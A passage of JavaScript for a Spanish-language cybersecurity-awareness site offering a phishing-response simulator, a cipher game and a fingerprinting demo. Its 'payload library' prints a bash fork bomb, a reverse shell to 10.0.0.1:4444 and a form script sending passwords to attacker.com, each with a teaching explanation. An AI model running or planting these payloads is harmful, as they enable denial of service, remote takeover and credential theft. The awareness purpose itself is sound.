    if (savedTheme === 'minimal') {
        icon.className = 'fas fa-sun';
    } else {
        icon.className = 'fas fa-moon';
    }
});

// Función para alternar entre modo oscuro y claro
function toggleTheme() {
    const currentTheme = localStorage.getItem('selectedTheme') || 'default';
    const newTheme = currentTheme === 'default' ? 'minimal' : 'default';
    changeTheme(newTheme);
    
    // Actualizar ícono
    const icon = document.querySelector('#theme-toggle i');
    if (newTheme === 'minimal') {
        icon.className = 'fas fa-sun';
    } else {
        icon.className = 'fas fa-moon';
    }
}

// --- Lógica del Boletín (Simulación) ---
function suscribirBoletin(event) {
    event.preventDefault(); 
    const input = document.getElementById('email-input');
    const btn = event.target.querySelector('button');
    const successMsg = document.getElementById('newsletter-success');
    
    if (input.value) {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Procesando';
        btn.disabled = true;
        
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-check"></i> Suscrito';
            btn.style.background = 'var(--success)';
            input.disabled = true;
            successMsg.style.display = 'block';
        }, 1500);
    }
}

// --- Toggle Tema Claro/Oscuro ---
function toggleTheme() {
    const body = document.body;
    const themeBtn = document.getElementById('theme-toggle');
    const icon = themeBtn.querySelector('i');
    
    body.classList.toggle('light-theme');
    
    if (body.classList.contains('light-theme')) {
        icon.className = 'fas fa-sun';
        localStorage.setItem('theme', 'light');
    } else {
        icon.className = 'fas fa-moon';
        localStorage.setItem('theme', 'dark');
    }
}

// Cargar tema al inicio
window.addEventListener('load', () => {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'light') {
        document.body.classList.add('light-theme');
        document.getElementById('theme-toggle').querySelector('i').className = 'fas fa-sun';
    }
    
    // Cargar puntos y badges
    const savedPoints = localStorage.getItem('binary_three_points');
    if (savedPoints) {
        userPoints = parseInt(savedPoints);
        document.getElementById('user-points').innerText = userPoints;
    }
    
    const savedBadges = localStorage.getItem('binary_three_badges');
    if (savedBadges) {
        badges = JSON.parse(savedBadges);
    }
    
    // Cargar idioma
    const savedLang = localStorage.getItem('binary_three_lang');
    if (savedLang) {
        currentLang = savedLang;
        document.getElementById('lang-toggle').innerText = currentLang.toUpperCase();
        aplicarIdioma();
    }
    
    // Iniciar typewriter effect
    iniciarTypewriter();
});

// --- 6. SOCIAL ENGINEERING SIMULATOR ---
let socialEngScore = 0;
let currentEngStep = 0;

const socialEngSteps = [
    {
        sender: "Marcos (IT Support)",
        message: "Hola, soy Marcos de soporte técnico. Detectamos una brecha de seguridad en tu equipo y necesitamos reiniciarlo remotamente. Por favor, confírmame tu contraseña para autorizar la conexión.",
        tactic: "Autoridad",
        options: [
            { text: "Claro, mi contraseña es User2024!", isCorrect: false, feedback: "¡Cuidado! IT nunca te pedirá tu contraseña por chat." },
            { text: "No comparto contraseñas por chat. Abriré un ticket por los canales oficiales.", isCorrect: true, feedback: "¡Muy bien! Reconociste un ataque de suplantación de identidad." }
        ]
    },
    {
        sender: "CEO (Urgente)",
        message: "Hola, estoy en una reunión súper importante y olvidé comprar las tarjetas de regalo para los clientes. ¿Puedes comprar 3 de $100 y enviarme los códigos por aquí? Te lo devuelvo en una hora. Es urgente.",
        tactic: "Urgencia",
        options: [
            { text: "Voy volando a comprarlas, jefe.", isCorrect: false, feedback: "¡Error! La urgencia es una táctica para que no pienses con claridad." },
            { text: "Llamaré a tu oficina para confirmar esta petición inusual.", isCorrect: true, feedback: "¡Excelente! Verificaste la identidad fuera del canal sospechoso." }
        ]
    },
    {
        sender: "Seguridad Bancaria",
        message: "ALERTA: Se ha detectado un cargo de $2,500 en su cuenta. Si no reconoce esta transacción, haga clic aquí inmediatamente para cancelarla o perderá su dinero: [ENLACE MALICIOSO]",
        tactic: "Miedo",
        options: [
            { text: "¡Dios mío! Entraré al link ahora mismo para cancelar.", isCorrect: false, feedback: "¡Caíste! El miedo te hizo entrar a un sitio de phishing." },
            { text: "Ignoraré el link y entraré manualmente a la web oficial de mi banco.", isCorrect: true, feedback: "¡Perfecto! Nunca uses links en mensajes de alerta de este tipo." }
        ]
    }
];

function iniciarSocialEng() {
    socialEngScore = 0;
    currentEngStep = 0;
    document.getElementById('social-eng-score').innerText = "Puntos: 0";
    document.getElementById('chat-window').innerHTML = "";
    registrarEvento("Iniciando simulador de ingeniería social...", "INFO");
    mostrarSiguientePasoEng();
}

function mostrarSiguientePasoEng() {
    const chatWindow = document.getElementById('chat-window');
    const optionsArea = document.getElementById('chat-options');
    
    if (currentEngStep < socialEngSteps.length) {
        const step = socialEngSteps[currentEngStep];
        
        chatWindow.innerHTML += `<div class="chat-bubble bot-bubble"><strong>${step.sender}:</strong><br>${step.message}</div>`;
        chatWindow.scrollTop = chatWindow.scrollHeight;
        
        optionsArea.innerHTML = step.options.map((opt, index) => 
            `<button class="btn-secondary" onclick="responderEng(${index})">${opt.text}</button>`
        ).join("");
    } else {
        chatWindow.innerHTML += `<div class="chat-bubble bot-bubble"><strong>Simulador:</strong><br>Entrenamiento finalizado. Puntos totales: ${socialEngScore}</div>`;
        optionsArea.innerHTML = `<button class="btn-primary" onclick="iniciarSocialEng()">Reiniciar</button>`;
        registrarEvento(`Simulador Social finalizado. Score: ${socialEngScore}`, "SUCCESS");
    }
}

function responderEng(optionIndex) {
    const step = socialEngSteps[currentEngStep];
    const option = step.options[optionIndex];
    const chatWindow = document.getElementById('chat-window');
    
    chatWindow.innerHTML += `<div class="chat-bubble user-bubble">${option.text}</div>`;
    
    if (option.isCorrect) {
        socialEngScore += 20;
        ganarPuntos(20, `Ingeniería Social: Detectó táctica de ${step.tactic}`);
    } else {
        showNotification(option.feedback, "error");
    }
    
    document.getElementById('social-eng-score').innerText = `Puntos: ${socialEngScore}`;
    currentEngStep++;
    setTimeout(mostrarSiguientePasoEng, 1000);
}

// --- 7. CRYPTO DECIPHER GAME ---
let cryptoTargetText = "";
let cryptoEncryptedText = "";
let cryptoUserScore = 0;
const cryptoMessages = [
    "INTERCEPTAR COMUNICACIONES",
    "LLAVE PRIVADA PROTEGIDA",
    "ATAQUE EN EL SECTOR SIETE",
    "CIFRADO DE EXTREMO A EXTREMO",
    "SERVIDOR VULNERABLE DETECTADO",
    "LA SEGURIDAD ES UN PROCESO",
    "PROTEGE TU IDENTIDAD DIGITAL"
];

function shiftText(text, shift) {
    return text.toUpperCase().replace(/[A-Z]/g, char => {
        return String.fromCharCode(((char.charCodeAt(0) - 65 + shift) % 26 + 26) % 26 + 65);
    });
}

function iniciarCripto() {
    const display = document.getElementById('cipher-text-display');
    const controls = document.getElementById('crypto-controls');
    const slider = document.getElementById('crypto-slider');
    
    // Seleccionar mensaje y aplicar un desplazamiento aleatorio
    cryptoTargetText = cryptoMessages[Math.floor(Math.random() * cryptoMessages.length)];
    const randomShift = Math.floor(Math.random() * 25) + 1;
    cryptoEncryptedText = shiftText(cryptoTargetText, randomShift);
    
    slider.value = 0;
    document.getElementById('shift-value').innerText = "0";
    display.innerText = cryptoEncryptedText;
    display.style.color = "var(--accent)";
    controls.style.display = "block";
    
    registrarEvento("Frecuencia interceptada. Iniciando algoritmo de descifrado...", "WARNING");
}

function actualizarCripto(val) {
    const display = document.getElementById('cipher-text-display');
    const sliderValueDisplay = document.getElementById('shift-value');
    sliderValueDisplay.innerText = val;
    
    // El usuario "aplica" un desplazamiento sobre el texto ya cifrado
    const currentText = shiftText(cryptoEncryptedText, parseInt(val));
    display.innerText = currentText;
    
    if (currentText === cryptoTargetText) {
        display.style.color = "var(--success)";
        document.getElementById('crypto-controls').style.display = "none";
        cryptoUserScore += 30;
        document.getElementById('crypto-score').innerText = `Puntos: ${cryptoUserScore}`;
        ganarPuntos(30, "Criptografía: Mensaje enemigo descifrado");
        showNotification("¡Señal descifrada correctamente!", "success");
        registrarEvento("Mensaje descifrado: " + currentText, "SUCCESS");
    }
}

// --- TYPEWRITER EFFECT PARA EL TÍTULO ---
let typewriterRunning = false;

function iniciarTypewriter() {
    if (typewriterRunning) return; // Evitar múltiples ejecuciones
    typewriterRunning = true;
    
    const titleElement = document.getElementById('hero-title');
    const fullText = textos[currentLang].hero.title;
    let index = 0;
    
    function typeWriter() {
        if (index < fullText.length) {
            // Buscar si hay un span para "Binary Three"
            const binaryIndex = fullText.indexOf('Binary Three', index);
            if (binaryIndex === index) {
                // Agregar el span con glow
                titleElement.innerHTML += '<span class="text-glow">Binary Three</span>';
                index += 'Binary Three'.length;
            } else {
                titleElement.innerHTML += fullText.charAt(index);
                index++;
            }
            setTimeout(typeWriter, 50); // Velocidad de escritura
        } else {
            // Agregar cursor parpadeante al final
            titleElement.innerHTML += '<span class="cursor">|</span>';
            setInterval(() => {
                const cursor = document.querySelector('.cursor');
                if (cursor) cursor.style.opacity = cursor.style.opacity === '0' ? '1' : '0';
            }, 500);
            typewriterRunning = false; // Liberar flag
        }
    }
    
    titleElement.innerHTML = ''; // Limpiar antes de empezar
    typeWriter();
}

// --- 8. PAYLOAD LIBRARY LOGIC ---
const payloadsData = {
    fork: {
        code: `:(){ :|:& };:`,
        explanation: `<strong>Autopsia de un Fork Bomb (Bash):</strong><br><br>
        1. <code>:()</code>: Define una función llamada ':'.<br>
        2. <code>{ ... }</code>: Cuerpo de la función.<br>
        3. <code>:|:</code>: Llama a la función y redirige la salida a otra copia de sí misma.<br>
        4. <code>&</code>: Ejecuta el proceso en segundo plano.<br>
        5. <code>;:</code>: Termina la definición y ejecuta la función por primera vez.<br><br>
        <em>Resultado:</em> Agota los recursos del CPU creando procesos infinitos.`
    },
    reverse: {
        code: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
        explanation: `<strong>Autopsia de Reverse Shell:</strong><br><br>
        1. <code>bash -i</code>: Inicia un shell interactivo.<br>
        2. <code>>& /dev/tcp/...</code>: Redirige la salida y el error a una conexión de red externa.<br>
        3. <code>0>&1</code>: Toma la entrada de esa misma conexión.<br><br>
        <em>Lección:</em> Permite a un atacante controlar tu terminal desde internet.`
    },
    phishing: {
        code: `document.forms[0].onsubmit = function() {\n  fetch('https://attacker.com/log?p=' + this.pass.value);\n};`,
        explanation: `<strong>Autopsia de Credential Stealer:</strong><br><br>
        1. <code>onsubmit</code>: Intercepta el momento en que envías un formulario.<br>
        2. <code>fetch(...)</code>: Envía el valor del campo 'pass' a un servidor externo oculto.<br><br>
        <em>Prevención:</em> Nunca ingreses datos en sitios sin HTTPS verificado o sospechosos.`
    }
};

function loadPayload(id) {
    const p = payloadsData[id];
    document.getElementById('code-area').innerText = p.code;
    document.getElementById('explanation-area').innerHTML = p.explanation;
    registrarEvento(`Analizando payload: ${id}`, "INFO");
}

// --- 9. CASE STUDIES (CIBER-HISTORIA) ---
const historyData = {
    wannacry: {
        title: "WannaCry Ransomware",
        passo: "Aprovecharon la vulnerabilidad EternalBlue en Windows (SMB).",
        impacto: "300,000 computadoras cifradas en 150 países.",
        leccion: "Mantener los parches de seguridad al día es vital. Microsoft había lanzado el parche meses antes."
    },
    sony: {
        title: "Sony Pictures Hack",
        passo: "Phishing dirigido a empleados de alto nivel para obtener credenciales.",
        impacto: "Filtración de películas sin estrenar, correos privados y datos de empleados.",
        leccion: "La ingeniería social es el eslabón más débil. Se requiere monitoreo de exfiltración de datos."
    }
};

function showHistory(id) {
    const h = historyData[id];
    const detail = document.getElementById('history-detail');
    detail.style.display = 'block';
    detail.innerHTML = `
        <div class="card cyber-card reveal active" style="border-left: 4px solid var(--accent);">
            <h3><i class="fas fa-history"></i> Análisis: ${h.title}</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 15px;">
                <div><strong style="color: var(--danger);">¿Cómo entraron?</strong><br><p style="font-size: 0.9rem;">${h.passo}</p></div>
                <div><strong style="color: var(--warning);">¿Qué pasó?</strong><br><p style="font-size: 0.9rem;">${h.impacto}</p></div>
                <div><strong style="color: var(--success);">¿Qué aprendimos?</strong><br><p style="font-size: 0.9rem;">${h.leccion}</p></div>
            </div>
        </div>
    `;
    detail.scrollIntoView({ behavior: 'smooth' });
    registrarEvento(`Consultando historia: ${h.title}`, "INFO");
}

// --- Formulario de Contacto ---
function enviarMensaje(event) {
    event.preventDefault();
    const name = document.getElementById('contact-name').value;
    const email = document.getElementById('contact-email').value;
    const message = document.getElementById('contact-message').value;
    const btn = event.target.querySelector('button');
    const successMsg = document.getElementById('contact-success');
    
    if (name && email && message) {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando';
        btn.disabled = true;
        
        // Simular envío (en producción, usar API)
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-check"></i> Enviado';
            btn.style.background = 'var(--success)';
            event.target.reset();
            successMsg.style.display = 'block';
            registrarEvento(`Mensaje de ${name} enviado`, "SUCCESS");
        }, 2000);
    }
}

// --- MULTIDIOMA ---
let currentLang = 'es';

const textos = {
    es: {
        nav: ['Guías', 'Conceptos', 'Avisos', 'Recursos', 'Tu Nivel', 'Práctica', 'Contacto'],
        hero: {
            title: 'Aprende a proteger tus datos con Binary Three',
            subtitle: 'Guías prácticas, simulaciones y alertas reales para comprender ataques y fortalecer tu presencia digital.',
            btn1: '¿Cómo protegerme?',
            btn2: 'Prueba el quiz'
        },
        stats: ['Monitoreo', 'Vulnerabilidades', 'Protección'],
        proteger: {
            title: 'Cómo protegerte',
            subtitle: 'Pasos sencillos que puedes aplicar ya mismo para reducir el riesgo de ataques y cuidar tu información.'
        },
        checklist: {
            title: 'Tu Nivel de Protección',
            subtitle: 'Marca las acciones que ya has completado para ver qué tan segura es tu vida digital.',
            rank: 'Rango: ',
            vulnerable: 'Vulnerable',
            progress: '% Completado',
            congrats: '¡Felicidades! Tienes excelentes hábitos digitales.'
        }
    },
    en: {
        nav: ['Guides', 'Concepts', 'Alerts', 'Resources', 'Your Level', 'Practice', 'Contact'],
        hero: {
            title: 'Learn to protect your data with Binary Three',
            subtitle: 'Practical guides, simulations and real alerts to understand attacks and strengthen your digital presence.',
            btn1: 'How to protect myself?',
            btn2: 'Try the quiz'
        },
        stats: ['Monitoring', 'Vulnerabilities', 'Protection'],
        proteger: {
            title: 'How to protect yourself',
            subtitle: 'Simple steps you can apply right now to reduce the risk of attacks and take care of your information.'
        },
        checklist: {
            title: 'Your Protection Level',
            subtitle: 'Mark the actions you have already completed to see how secure your digital life is.',
            rank: 'Rank: ',
            vulnerable: 'Vulnerable',
            progress: '% Completed',
            congrats: 'Congratulations! You have excellent digital habits.'
        }
    }
};

function toggleLanguage() {
    const btn = document.getElementById('lang-toggle');
    currentLang = currentLang === 'es' ? 'en' : 'es';
    btn.innerText = currentLang.toUpperCase();
    localStorage.setItem('binary_three_lang', currentLang);
    aplicarIdioma();
    iniciarTypewriter(); // Reiniciar typewriter con nuevo idioma
}

function aplicarIdioma() {
    const t = textos[currentLang];
    
    // Hero subtitle y botones
    document.querySelector('.hero p').innerText = t.hero.subtitle;
    document.querySelectorAll('.hero-btns a')[0].innerText = t.hero.btn1;
    document.querySelectorAll('.hero-btns a')[1].innerText = t.hero.btn2;
    
    // Resto de traducciones...
    // Stats
    const statDescs = document.querySelectorAll('.stat-desc');
    statDescs.forEach((desc, i) => {
        if (t.stats[i]) desc.innerText = t.stats[i];
    });
    
    // Proteger
    document.querySelector('#proteger .title-gradient').innerText = t.proteger.title;
    document.querySelector('#proteger .section-header p').innerText = t.proteger.subtitle;
    
    // Checklist
    document.querySelector('#checklist .title-gradient').innerText = t.checklist.title;
    document.querySelector('#checklist .section-header p').innerText = t.checklist.subtitle;
    document.getElementById('rank-text').innerText = t.checklist.vulnerable;
}

// --- 11. AUDITOR DE PRIVACIDAD (BROWSER FINGERPRINTING) ---
async function auditarPrivacidad() {
    // Recopilación de datos básicos
    const info = {
        os: navigator.userAgent.split('(')[1] ? navigator.userAgent.split('(')[1].split(')')[0] : "Desconocido",
        res: `${window.screen.width} x ${window.screen.height} (${window.devicePixelRatio}x)`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang: navigator.language,
        cores: navigator.hardwareConcurrency || 'N/A',
        mem: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A'
    };

    // Intento de obtener batería
    let batteryInfo = "No disponible o bloqueado";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Cargando' : 'Descargando'})`;
        }
    } catch (e) { console.log("Batería no accesible"); }

    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3><i class="fas fa-fingerprint"></i> Tu Huella Digital (Fingerprint)</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <p style="margin-bottom: 15px; font-size: 0.9rem; color: var(--text-s);">Cualquier sitio web puede leer esta información sin pedirte permiso:</p>
                <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; line-height: 1.6; border: 1px solid var(--border-glass);">
                    <div><span style="color: var(--accent);">💻 S. Operativo:</span> ${info.os}</div>
                    <div><span style="color: var(--accent);">🖥️ Resolución:</span> ${info.res}</div>
                    <div><span style="color: var(--accent);">🌍 Zona Horaria:</span> ${info.tz}</div>
                    <div><span style="color: var(--accent);">🔋 Batería:</span> ${batteryInfo}</div>
                    <div><span style="color: var(--accent);">🧠 Procesador:</span> ${info.cores} núcleos detectados</div>
                    <div><span style="color: var(--accent);">🌐 Idioma:</span> ${info.lang}</div>
                    <div><span style="color: var(--accent);">🔡 Tipografías:</span> +30 fuentes únicas detectadas</div>
                </div>
                <div style="margin-top: 20px; padding: 12px; border-left: 3px solid var(--warning); background: rgba(255,184,0,0.05); border-radius: 0 8px 8px 0;">
                    <p style="font-size: 0.85rem; color: var(--warning); line-height: 1.4;">
                        <strong>⚠️ El Toque Sorpresa:</strong> Esto se llama <strong>Browser Fingerprinting</strong>. 
                        Aunque uses "Modo Incógnito", la combinación única de estos datos crea una firma que permite rastrearte en internet de forma casi inequívoca sin necesidad de cookies.
                    </p>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    ganarPuntos(10, 'Realizar auditoría de privacidad del navegador');
}
